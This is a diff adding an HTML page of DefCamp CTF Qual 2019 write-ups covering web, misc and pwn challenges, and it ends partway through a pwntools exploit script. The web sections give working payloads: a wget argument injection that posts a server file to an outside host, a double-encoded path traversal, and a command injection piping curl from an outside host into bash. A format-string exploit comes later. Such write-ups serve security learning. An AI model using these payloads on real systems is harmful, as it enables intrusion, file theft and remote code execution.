@@ -1,0 +1,544 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>DefCamp CTF Qual 2019</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#downloader-v1">downloader-v1</a>
+    
+                <a class="dropdown-item" href="#imgur">imgur</a>
+    
+                <a class="dropdown-item" href="#online-album">online-album</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                misc
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#numbers">numbers</a>
+    
+                <a class="dropdown-item" href="#eye-of-the-tiger">eye-of-the-tiger</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                pwnrev
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#get-access">get-access</a>
+    
+                <a class="dropdown-item" href="#secret">secret</a>
+    
+                <a class="dropdown-item" href="#crack-me-username">crack-me-username</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#downloader-v1" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">downloader-v1</span>
+            </a>
+    
+<a href="#imgur" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">imgur</span>
+            </a>
+    
+<a href="#online-album" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">online-album</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">misc</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#numbers" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">numbers</span>
+            </a>
+    
+<a href="#eye-of-the-tiger" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">eye-of-the-tiger</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">pwnrev</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu2" class="collapse sidebar-submenu">
+            <a href="#get-access" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">get-access</span>
+            </a>
+    
+<a href="#secret" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">secret</span>
+            </a>
+    
+<a href="#crack-me-username" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">crack-me-username</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="defcamp-ctf-qual-2019"><a class="header-link" href="#defcamp-ctf-qual-2019"></a>DefCamp CTF Qual 2019</h1>
+
+<h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
+<h3 id="downloader-v1"><a class="header-link" href="#downloader-v1"></a>Downloader v1</h3>
+<p>This challenge allows you to input a URL. Then it will use <code>wget</code> to download the content of this URL and put it into <code>/upload/&lt;random&gt;</code>. After this, it will run <code>bash -c &#39;rm $target/*.{php,pht,phtml,php4,php5,php6,php7}&#39;</code> to prevent uploading php files.</p>
+<p>But we can use argument injection to upload file:</p>
+<p><code>wget http://kaibro.tw --post-file=/var/www/html/index.php kaibro.tw:8787</code></p>
+<pre class="hljs"><code><span class="hljs-meta">&lt;?php</span>
+
+ini_set(<span class="hljs-string">'display_errors'</span>, <span class="hljs-number">0</span>);
+$out   = <span class="hljs-keyword">false</span>;
+$url   = $_POST[<span class="hljs-string">'url'</span>] ?? <span class="hljs-keyword">false</span>;
+$error = <span class="hljs-keyword">false</span>;
+
+<span class="hljs-keyword">if</span> ($url &amp;&amp; !preg_match(<span class="hljs-string">'#^https?://([a-z0-9-]+\.)*[a-z0-9-]+\.[a-z0-9-]+/.+#i'</span>, $url)) {
+    $error = <span class="hljs-string">'Invalid URL'</span>;
+} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ($url &amp;&amp; preg_match(<span class="hljs-string">'/\.(htaccess|ph(p\d?|t|tml))$/'</span>, $url)) { <span class="hljs-comment">// .htaccess .php .php3 -  .php7 .phtml .pht</span>
+    $error = <span class="hljs-string">'Sneaky you!'</span>;
+}
+
+<span class="hljs-keyword">if</span> (!$error &amp;&amp; $url) {
+    $target = <span class="hljs-string">'uploads/'</span> .uniqid() . bin2hex(openssl_random_pseudo_bytes(<span class="hljs-number">8</span>));
+    mkdir($target);
+    chdir($target);
+    touch(<span class="hljs-string">'.htaccess'</span>);
+
+    $cmd = escapeshellcmd(<span class="hljs-string">'wget '</span> . $url) . <span class="hljs-string">' 2&gt;&amp;1'</span>;
+    $out = <span class="hljs-string">"\$ cd $target"</span> . PHP_EOL;
+    $out .= <span class="hljs-string">'$ '</span> . $cmd . PHP_EOL;
+    $out .= shell_exec($cmd);
+
+    $cmd = <span class="hljs-string">"bash -c 'rm $target/*.{php,pht,phtml,php4,php5,php6,php7}'"</span>;
+    $out .= <span class="hljs-string">'$ '</span> . $cmd . PHP_EOL;
+    $out .= shell_exec($cmd) . PHP_EOL;
+}
+
+<span class="hljs-meta">?&gt;</span>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Downloader v1&lt;/title&gt;
+    &lt;link rel=<span class="hljs-string">"stylesheet"</span> href=<span class="hljs-string">"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"</span> integrity=<span class="hljs-string">"sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm"</span> crossorigin=<span class="hljs-string">"anonymous"</span>&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+&lt;div <span class="hljs-class"><span class="hljs-keyword">class</span>="<span class="hljs-title">container</span> <span class="hljs-title">mt</span>-5"&gt;
+    &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>="<span class="hljs-title">row</span>"&gt;
+        &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>="<span class="hljs-title">col</span>-8 <span class="hljs-title">offset</span>-2"&gt;
+            &lt;<span class="hljs-title">h3</span> <span class="hljs-title">class</span>="<span class="hljs-title">text</span>-<span class="hljs-title">center</span>"&gt;<span class="hljs-title">File</span> <span class="hljs-title">downloader</span> <span class="hljs-title">v1</span>&lt;/<span class="hljs-title">h3</span>&gt;
+            &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>="<span class="hljs-title">card</span> <span class="hljs-title">mt</span>-5"&gt;
+                &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>="<span class="hljs-title">card</span>-<span class="hljs-title">header</span>"&gt;<span class="hljs-title">Specify</span> <span class="hljs-title">an</span> <span class="hljs-title">URL</span> <span class="hljs-title">to</span> <span class="hljs-title">download</span>&lt;/<span class="hljs-title">div</span>&gt;
+                &lt;<span class="hljs-title">form</span> <span class="hljs-title">class</span>="<span class="hljs-title">card</span>-<span class="hljs-title">body</span>" <span class="hljs-title">method</span>="<span class="hljs-title">POST</span>"&gt;
+                    &lt;?<span class="hljs-title">php</span> <span class="hljs-title">if</span> ($<span class="hljs-title">error</span>): ?&gt;
+                    &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>="<span class="hljs-title">alert</span> <span class="hljs-title">alert</span>-<span class="hljs-title">danger</span>" <span class="hljs-title">role</span>="<span class="hljs-title">alert</span>"&gt;&lt;?<span class="hljs-title">php</span> <span class="hljs-title">echo</span> <span class="hljs-title">htmlentities</span>($<span class="hljs-title">error</span>); ?&gt;&lt;/<span class="hljs-title">div</span>&gt;
+                    &lt;?<span class="hljs-title">php</span> <span class="hljs-title">endif</span>;?&gt;
+                    &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>="<span class="hljs-title">form</span>-<span class="hljs-title">group</span>"&gt;
+                        &lt;<span class="hljs-title">label</span>&gt;<span class="hljs-title">URL</span> <span class="hljs-title">to</span> <span class="hljs-title">download</span>:&lt;/<span class="hljs-title">label</span>&gt;
+                        &lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>="<span class="hljs-title">text</span>" <span class="hljs-title">name</span>="<span class="hljs-title">url</span>" <span class="hljs-title">placeholder</span>="<span class="hljs-title">http</span>://<span class="hljs-title">example</span>.<span class="hljs-title">com</span>/<span class="hljs-title">image</span>.<span class="hljs-title">jpg</span>" <span class="hljs-title">value</span>="&lt;?<span class="hljs-title">php</span> <span class="hljs-title">echo</span> <span class="hljs-title">htmlentities</span>($<span class="hljs-title">url</span>, <span class="hljs-title">ENT_QUOTES</span>); ?&gt;" <span class="hljs-title">class</span>="<span class="hljs-title">form</span>-<span class="hljs-title">control</span>" &gt;
+                    &lt;/<span class="hljs-title">div</span>&gt;
+                    &lt;<span class="hljs-title">button</span> <span class="hljs-title">type</span>="<span class="hljs-title">submit</span>" <span class="hljs-title">class</span>="<span class="hljs-title">btn</span> <span class="hljs-title">btn</span>-<span class="hljs-title">primary</span> <span class="hljs-title">float</span>-<span class="hljs-title">right</span>"&gt;<span class="hljs-title">Submit</span>&lt;/<span class="hljs-title">button</span>&gt;
+                &lt;/<span class="hljs-title">form</span>&gt;
+                &lt;?<span class="hljs-title">php</span> <span class="hljs-title">if</span> ($<span class="hljs-title">out</span>): ?&gt;
+                &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>="<span class="hljs-title">card</span>-<span class="hljs-title">header</span> <span class="hljs-title">card</span>-<span class="hljs-title">footer</span>"&gt;<span class="hljs-title">Output</span>:&lt;/<span class="hljs-title">div</span>&gt;
+                &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>="<span class="hljs-title">card</span>-<span class="hljs-title">body</span>"&gt;
+                    &lt;<span class="hljs-title">pre</span>&gt;&lt;<span class="hljs-title">code</span>&gt;&lt;?<span class="hljs-title">php</span> <span class="hljs-title">echo</span> <span class="hljs-title">htmlentities</span>($<span class="hljs-title">out</span>); ?&gt;&lt;/<span class="hljs-title">code</span>&gt;&lt;/<span class="hljs-title">pre</span>&gt;
+                &lt;/<span class="hljs-title">div</span>&gt;
+                &lt;?<span class="hljs-title">php</span> <span class="hljs-title">endif</span>;?&gt;
+            &lt;/<span class="hljs-title">div</span>&gt;
+        &lt;/<span class="hljs-title">div</span>&gt;
+    &lt;/<span class="hljs-title">div</span>&gt;
+&lt;/<span class="hljs-title">div</span>&gt;
+
+&lt;!-- &lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>="<span class="hljs-title">flag</span>.<span class="hljs-title">php</span>"&gt;###&lt;/<span class="hljs-title">a</span>&gt; --&gt;</span></code></pre><p>read the <code>flag.php</code>:</p>
+<pre class="hljs"><code>GET ME!
+<span class="hljs-meta">&lt;?php</span> <span class="hljs-comment">/* DCTF{f8ebc33b836f0ac262fef4c18d3b18ed405da41bb4389c0d0fa1a5a997da1af0} */</span> <span class="hljs-meta">?&gt;</span></code></pre><h3 id="imgur"><a class="header-link" href="#imgur"></a>imgur</h3>
+<p>In this challenge, you can set your avatar from imgur.com.</p>
+<p>It will download the image from imgur.com and put it into <code>profiles/xxxxx.jpg</code>.</p>
+<p>And there is a LFI vulnerability: <code>?page=xxxxx</code></p>
+<p>So our target is to put malicious php code into image, then use LFI include it to RCE.</p>
+<p class="img-container"><img src="https://github.com/w181496/CTF/raw/master/dctf2019-qual/imgur/imgur.png" alt=""></p>
+<p><code>DCTF{762241E8981F7E4C2B134C2894747990989FB5DFF0A3AD8DB5A0CEB5D05CBD8D}</code></p>
+<h3 id="online-album"><a class="header-link" href="#online-album"></a>online-album</h3>
+<p>In this challenge, the <code>/download/</code> path looks so weird.</p>
+<p>e.g. Visiting <code>/download/index.php</code> will show the php source code.</p>
+<p>After fuzzing, I found path traversal vulnerability: <code>https://online-album.dctfq19.def.camp/download/%252e%252e%252fcomposer.json</code></p>
+<p>So we can read any php source code now:</p>
+<p><code>/download/%252e%252e%252froutes/web.php</code></p>
+<pre class="hljs"><code><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-comment">/*
+|--------------------------------------------------------------------------
+| Web Routes
+|--------------------------------------------------------------------------
+|
+| Here is where you can register web routes for your application. These
+| routes are loaded by the RouteServiceProvider within a group which
+| contains the "web" middleware group. Now create something great!
+|
+*/</span>
+
+Route::get(<span class="hljs-string">'/'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">()</span> </span>{
+    <span class="hljs-keyword">return</span> view(<span class="hljs-string">'welcome'</span>);
+});
+
+Auth::routes();
+
+Route::get(<span class="hljs-string">'/home'</span>, <span class="hljs-string">'HomeController@index'</span>)-&gt;name(<span class="hljs-string">'home'</span>);
+Route::get(<span class="hljs-string">'/album/{path}'</span>, <span class="hljs-string">'HomeController@album'</span>)-&gt;name(<span class="hljs-string">'album'</span>)-&gt;where(<span class="hljs-string">'path'</span>, <span class="hljs-string">'.*'</span>);
+Route::get(<span class="hljs-string">'/download/{path}'</span>, <span class="hljs-string">'HomeController@download'</span>)-&gt;name(<span class="hljs-string">'download'</span>)-&gt;where(<span class="hljs-string">'path'</span>, <span class="hljs-string">'.*'</span>);
+Route::post(<span class="hljs-string">'/auto-logout'</span>, <span class="hljs-string">'HomeController@auto_logout'</span>)-&gt;name(<span class="hljs-string">'auto-logout'</span>);</code></pre><p>Let&#39;s read the HomeController: <code>/download/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/var/www/html/app/Http/Controllers/HomeController.php</code></p>
+<pre class="hljs"><code><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">App</span>\<span class="hljs-title">Http</span>\<span class="hljs-title">Controllers</span>;
+
+<span class="hljs-keyword">use</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Http</span>\<span class="hljs-title">Request</span>;
+<span class="hljs-keyword">use</span> <span class="hljs-title">Auth</span>;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HomeController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span>
+</span>{
+    <span class="hljs-comment">/**
+     * Create a new controller instance.
+     *
+     * <span class="hljs-doctag">@return</span> void
+     */</span>
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span>
+    </span>{
+        <span class="hljs-keyword">$this</span>-&gt;middleware(<span class="hljs-string">'auth'</span>);
+    }
+
+    <span class="hljs-comment">/**
+     * Show the application dashboard.
+     *
+     * <span class="hljs-doctag">@return</span> \Illuminate\Contracts\Support\Renderable
+     */</span>
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span><span class="hljs-params">()</span>
+    </span>{
+        <span class="hljs-keyword">return</span> view(<span class="hljs-string">'home'</span>);
+    }
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">album</span><span class="hljs-params">(Request $request, $path)</span>
+    </span>{
+        <span class="hljs-comment">// dd($path);</span>
+        <span class="hljs-comment">// dd(getcwd());</span>
+
+        $path = urldecode($path);
+
+        <span class="hljs-keyword">if</span> ($path[<span class="hljs-number">0</span>] == <span class="hljs-string">"/"</span>) {
+            $path = substr($str, <span class="hljs-number">1</span>);
+        }
+
+        $files = scandir($path);
+
+        <span class="hljs-keyword">foreach</span> ($files <span class="hljs-keyword">as</span> $key =&gt; $file) {
+            <span class="hljs-keyword">if</span> ($file[<span class="hljs-number">0</span>] == <span class="hljs-string">"."</span>) {
+                <span class="hljs-keyword">unset</span>($files[$key]);
+            }
+        }
+        <span class="hljs-comment">// $files = scandir("/var/www/html/");</span>
+        $html = <span class="hljs-string">""</span>;
+        <span class="hljs-keyword">foreach</span> ($files <span class="hljs-keyword">as</span> $photo) {
+            $info = pathinfo($photo);
+            <span class="hljs-keyword">if</span>(array_key_exists(<span class="hljs-string">"extension"</span>, $info)){
+                <span class="hljs-keyword">if</span> ($info[<span class="hljs-string">"extension"</span>] == <span class="hljs-string">"jpeg"</span>) {
+                $html.=<span class="hljs-string">"&lt;a target='_blank' href='/download/"</span>.$path.<span class="hljs-string">"/"</span>.$photo.<span class="hljs-string">"'&gt;&lt;img width='700' src='/"</span>.$path.<span class="hljs-string">"/"</span>.$photo.<span class="hljs-string">"'&gt;&lt;/a&gt;&lt;hr&gt;"</span>;
+                }
+            }
+
+        }
+        <span class="hljs-keyword">return</span> view(<span class="hljs-string">'home'</span>, [
+            <span class="hljs-string">"files"</span> =&gt; $files,
+            <span class="hljs-string">"html"</span> =&gt; $html,
+        ]);     
+
+    }
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">download</span><span class="hljs-params">(Request $request, $path)</span>
+    </span>{
+        <span class="hljs-comment">// dd($path);</span>
+        <span class="hljs-comment">// dd(getcwd());</span>
+
+        $path = urldecode($path);
+
+        <span class="hljs-keyword">if</span> ($path[<span class="hljs-number">0</span>] == <span class="hljs-string">"/"</span>) {
+            $path = substr($str, <span class="hljs-number">1</span>);
+        }
+
+        <span class="hljs-keyword">if</span> (strpos($path, <span class="hljs-string">"../.."</span>)) {
+            dd(<span class="hljs-string">"Ilegal path found!"</span>);
+        }
+
+        $file = file_get_contents($path);
+        <span class="hljs-keyword">return</span> $file;
+
+    }
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">auto_logout</span><span class="hljs-params">(Request $request)</span>
+    </span>{
+        Auth::logout();
+        <span class="hljs-comment">//delete file after logout</span>
+        $cmd = <span class="hljs-string">'rm "'</span>.storage_path().<span class="hljs-string">'/framework/sessions/'</span>.escapeshellarg($request-&gt;logut_token).<span class="hljs-string">'"'</span>;
+        shell_exec($cmd);
+    }
+
+
+}</code></pre><p>There is a obvious Command Injection vulnerability in  the <code>auto_logout()</code> function.</p>
+<p>We can insert <code>&quot;;curl kaibro.tw|bash;&quot;</code> into <code>logout_token</code>, then get RCE.</p>
+<p class="img-container"><img src="https://github.com/w181496/CTF/raw/master/dctf2019-qual/onlinealbum/flag.png" alt=""></p>
+<p><code>DCTF{1196df3f624df7a099d4364e96df21a4c7283071177237bdd36e0981da68bd29}</code></p>
+<h2 id="misc"><a class="header-link" href="#misc"></a>Misc</h2>
+<h3 id="numbers"><a class="header-link" href="#numbers"></a>numbers</h3>
+<p>This challenge is a classic nim game. First, build a nim game state table. Then, we are done. Notice that the timeout limit is very strict. So I rent a GCP server in switzerland in order to solve it.</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+r = remote(<span class="hljs-string">'206.81.24.129'</span>, <span class="hljs-number">2337</span>)
+
+r.sendlineafter(<span class="hljs-string">"Hi! What's your name?\n"</span>, <span class="hljs-string">'a'</span>)
+r.sendlineafter(<span class="hljs-string">'Ready? Y/N\n'</span>, <span class="hljs-string">'Y'</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">nim_tables</span><span class="hljs-params">(moves)</span>:</span>
+    table = [<span class="hljs-number">0</span>]
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">1000</span> + <span class="hljs-number">1</span>):
+        values = []
+        <span class="hljs-keyword">for</span> move <span class="hljs-keyword">in</span> moves:
+            <span class="hljs-keyword">if</span> i - move &gt;= <span class="hljs-number">0</span>:
+                values.append(table[i - move])
+        <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> <span class="hljs-keyword">in</span> values:
+            table.append(<span class="hljs-number">1</span>)
+        <span class="hljs-keyword">else</span>:
+            table.append(<span class="hljs-number">0</span>)
+    <span class="hljs-keyword">return</span> table
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">go</span><span class="hljs-params">()</span>:</span>
+    r.recvlines(<span class="hljs-number">2</span>)
+    moves = eval(r.recvline())
+    moves = sorted(moves)
+    table = nim_tables(moves)
+
+    <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
+        text = r.recvline()
+        score = int(text.decode().partition(<span class="hljs-string">'Total Score:  '</span>)[<span class="hljs-number">2</span>])
+        print(f<span class="hljs-string">'score: {score}'</span>)
+        <span class="hljs-keyword">for</span> move <span class="hljs-keyword">in</span> moves[::<span class="hljs-number">-1</span>]:
+            <span class="hljs-keyword">if</span> score - move &gt;= <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> table[score - move] == <span class="hljs-number">0</span>:
+                r.sendlineafter(<span class="hljs-string">'Your move: '</span>, str(move))
+                <span class="hljs-keyword">break</span>
+        text = r.recvline()
+        <span class="hljs-keyword">if</span> <span class="hljs-string">b'Well done'</span> <span class="hljs-keyword">in</span> text:
+            <span class="hljs-keyword">break</span>
+        text = r.recvline()
+        <span class="hljs-keyword">if</span> <span class="hljs-string">b'Well done'</span> <span class="hljs-keyword">in</span> text:
+            <span class="hljs-keyword">break</span>
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>):
+    go()</code></pre><h3 id="eye-of-the-tiger"><a class="header-link" href="#eye-of-the-tiger"></a>Eye Of The Tiger</h3>
+<p>We found the solution to this challenge at the last 20 minutes, and it&#39;s too late to solve it. QQ</p>
+<p>This challenge is a tutorial video. We found that there was a adblock <a href="https://github.com/gorhill/uBlock">chrome extension</a> installed on the author&#39;s computer, and it added a number continuously. </p>
+<p class="img-container"><img src="https://i.imgur.com/xTs7lLG.png" alt=""></p>
+<p>We noticed that this number only added either 1 or 2. We recorded the amount of change and converted them to 0 and 1. Then, we converted each 8 bits to an ascii character. The final result is the flag.</p>
+<pre class="hljs"><code><span class="hljs-number">01000100010000110101010001000110011110110011000001100100</span>
+DCTF{<span class="hljs-number">0</span>d</code></pre><h2 id="pwnrev"><a class="header-link" href="#pwnrev"></a>PwnRev</h2>
+<h3 id="get-access"><a class="header-link" href="#get-access"></a>get-access</h3>
+<p>There was an format string vulnerability in the username. I used <code>%p</code> to dump the stack, and I found a string from <code>%30$p</code>. It&#39;s the password for this challenge.</p>
+<pre class="hljs"><code><span class="hljs-symbol">username:</span> test
+<span class="hljs-symbol">password:</span> $_TH1S1STH34W3S0M3P4sSw0RDF0RY0UDCTF2019_</code></pre><h3 id="secret"><a class="header-link" href="#secret"></a>secret</h3>
+<p>Just use format string to leak <code>canary</code> and <code>libc base</code>; then use buffer overflow to write retrun address as one gadget.</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python</span>
+
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+ip = <span class="hljs-string">"206.81.24.129"</span>
+port = <span class="hljs-number">1339</span>
+
+context.arch = <span class="hljs-string">"amd64"</span>
+
+r = remote(ip, port)
+<span class="hljs-comment"># r = process("pwn_secret")</span>
+
+raw_input(<span class="hljs-string">"$"</span>)
+r.sendlineafter(<span class="hljs-string">":"</span>, <span class="hljs-string">"_%15$p_%16$p_%17$p"</span>)
+out = r.recvline().split(<span class="hljs-string">"_"</span>)
+canary = int(out[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)
+code_base = int(out[<span class="hljs-number">2</span>], <span class="hljs-number">16</span>) - <span class="hljs-number">3136</span>
+libc_base = int(out[<span class="hljs-number">3</span>], <span class="hljs-number">16</span>) - <span class="hljs-number">133168</span>
+
+log.info(hex(canary))
+log.info(hex(code_base))
+log.info(hex(libc_base))
+
